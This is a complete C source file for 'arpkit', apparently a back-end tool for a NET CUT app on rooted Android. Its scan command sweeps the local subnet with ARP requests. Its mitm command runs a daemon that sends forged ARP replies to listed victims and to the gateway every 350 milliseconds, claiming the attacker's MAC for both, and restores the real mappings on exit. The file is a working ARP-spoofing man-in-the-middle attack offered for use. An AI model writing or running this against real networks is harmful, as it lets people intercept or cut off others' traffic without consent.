/* arpkit — minimal ARP toolkit for NET CUT (rooted Android)
 *
 *   arpkit scan <iface> <myip> <mymac> [timeout_ms]
 *       -> prints "IP MAC" per discovered host
 *
 *   arpkit mitm <iface> <myip> <mymac> <gwip> <gwmac> <ip:mac,ip:mac,...>
 *       -> poisons all targets forever (unicast ARP, 350ms interval)
 *          SIGTERM/SIGINT -> heals ARP mappings and exits cleanly
 *
 * Build (Termux):  clang -O2 -static -o arpkit arpkit.c
 */
#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define MAX_TGT 64

static volatile sig_atomic_t g_stop = 0;
static void on_sig(int s) { (void)s; g_stop = 1; }

static int mac_parse(const char *s, unsigned char out[6]) {
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) out[i] = (unsigned char)v[i];
    return 0;
}

static void mac_fmt(const unsigned char m[6], char out[18]) {
    sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static int open_raw(const char *iface) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = (int)if_nametoindex(iface);
    if (sll.sll_ifindex == 0) { close(fd); return -1; }
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    struct timeval tv = { .tv_sec = 0, .tv_usec = 300000 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    return fd;
}

static void build_arp(unsigned char *frame,
                      const unsigned char sha[6], uint32_t spa,
                      const unsigned char tha[6], uint32_t tpa,
                      const unsigned char eth_dst[6], uint16_t op) {
    memset(frame, 0, 42);
    memcpy(frame + 0, eth_dst, 6);
    memcpy(frame + 6, sha, 6);
    frame[12] = 0x08; frame[13] = 0x06;
    frame[14] = 0x00; frame[15] = 0x01;
    frame[16] = 0x08; frame[17] = 0x00;
    frame[18] = 6; frame[19] = 4;
    frame[20] = (unsigned char)(op >> 8); frame[21] = (unsigned char)(op & 0xff);
    memcpy(frame + 22, sha, 6);
    memcpy(frame + 28, &spa, 4);
    memcpy(frame + 32, tha, 6);
    memcpy(frame + 38, &tpa, 4);
}

/* ---------------- scan ---------------- */
static int cmd_scan(int argc, char **argv) {
    if (argc < 5) { fprintf(stderr, "usage: arpkit scan IFACE MYIP MYMAC [timeout_ms]\n"); return 2; }
    const char *iface = argv[2];
    uint32_t myip; inet_aton(argv[3], (struct in_addr *)&myip);
    unsigned char mymac[6];
    if (mac_parse(argv[4], mymac)) { fprintf(stderr, "bad mac\n"); return 2; }
    int timeout_ms = (argc > 5) ? atoi(argv[5]) : 2500;

    int fd = open_raw(iface);
    if (fd < 0) { perror("socket"); return 1; }

    unsigned char frame[42], bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff}, zero[6] = {0};
    uint32_t base = ntohl(myip) & 0xFFFFFF00;
    for (int i = 1; i < 255; i++) {
        uint32_t tpa = htonl(base + (uint32_t)i);
        build_arp(frame, mymac, myip, zero, tpa, bcast, 1);
        send(fd, frame, 42, 0);
    }

    char seen[256][18];
    int nseen = 0;
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (;;) {
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long el = (t1.tv_sec - t0.tv_sec) * 1000 + (t1.tv_nsec - t0.tv_nsec) / 1000000;
        if (el > timeout_ms) break;
        unsigned char buf[2048];
        ssize_t n = recv(fd, buf, sizeof(buf), 0);
        if (n < 42) continue;
        if (buf[12] != 0x08 || buf[13] != 0x06) continue;
        uint16_t op = ((uint16_t)buf[20] << 8) | buf[21];
        if (op != 1 && op != 2) continue;
        char ipstr[16], macstr[18];
        struct in_addr a; memcpy(&a, buf + 28, 4);
        inet_ntop(AF_INET, &a, ipstr, sizeof(ipstr));
        mac_fmt(buf + 22, macstr);
        if (strcmp(macstr, "00:00:00:00:00:00") == 0) continue;
        int dup = 0;
        for (int i = 0; i < nseen; i++) if (!strcmp(seen[i], macstr)) dup = 1;
        if (dup) continue;
        if (nseen < 256) strcpy(seen[nseen++], macstr);
        printf("%s %s\n", ipstr, macstr);
        fflush(stdout);
    }
    close(fd);
    return 0;
}

/* ---------------- mitm (poison daemon) ---------------- */
struct tgt { uint32_t ip; unsigned char mac[6]; };

static int cmd_mitm(int argc, char **argv) {
    if (argc < 8) {
        fprintf(stderr, "usage: arpkit mitm IFACE MYIP MYMAC GWIP GWMAC ip:mac,ip:mac,...\n");
        return 2;
    }
    const char *iface = argv[2];
    uint32_t myip, gwip;
    inet_aton(argv[3], (struct in_addr *)&myip);
    inet_aton(argv[5], (struct in_addr *)&gwip);
    unsigned char mymac[6], gwmac[6];
    if (mac_parse(argv[4], mymac) || mac_parse(argv[6], gwmac)) { fprintf(stderr, "bad mac\n"); return 2; }

    struct tgt tg[MAX_TGT];
    int nt = 0;
    char *list = strdup(argv[7]);
    for (char *tok = strtok(list, ","); tok && nt < MAX_TGT; tok = strtok(NULL, ",")) {
        char *c = strchr(tok, ':');
        if (!c) continue;
        *c = 0;
        struct in_addr a;
        if (!inet_aton(tok, &a)) continue;
        unsigned char m[6];
        if (mac_parse(c + 1, m)) continue;
        tg[nt].ip = a.s_addr;
        memcpy(tg[nt].mac, m, 6);
        nt++;
    }

    signal(SIGTERM, on_sig);
    signal(SIGINT, on_sig);

    int fd = open_raw(iface);
    if (fd < 0) { perror("socket"); return 1; }

    unsigned char frame[42];
    while (!g_stop) {
        for (int i = 0; i < nt; i++) {
            /* to victim: "gateway is-at me" (unicast) */
            build_arp(frame, mymac, gwip, tg[i].mac, tg[i].ip, tg[i].mac, 2);
            send(fd, frame, 42, 0);
            /* to gateway: "victim is-at me" (unicast) */
            build_arp(frame, mymac, tg[i].ip, gwmac, gwip, gwmac, 2);
            send(fd, frame, 42, 0);
        }
        struct timespec ts = { .tv_sec = 0, .tv_nsec = 350000000L };
        nanosleep(&ts, NULL);
    }

    /* heal: restore real mappings (3x) */
    for (int r = 0; r < 3; r++) {
        for (int i = 0; i < nt; i++) {
            build_arp(frame, gwmac, gwip, tg[i].mac, tg[i].ip, tg[i].mac, 2);
            send(fd, frame, 42, 0);
            build_arp(frame, tg[i].mac, tg[i].ip, gwmac, gwip, gwmac, 2);
            send(fd, frame, 42, 0);
        }
        usleep(50000);
    }
    close(fd);
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "arpkit scan|mitm ...\n");
        return 2;
    }
    if (!strcmp(argv[1], "scan")) return cmd_scan(argc, argv);
    if (!strcmp(argv[1], "mitm")) return cmd_mitm(argc, argv);
    fprintf(stderr, "unknown cmd\n");
    return 2;
}
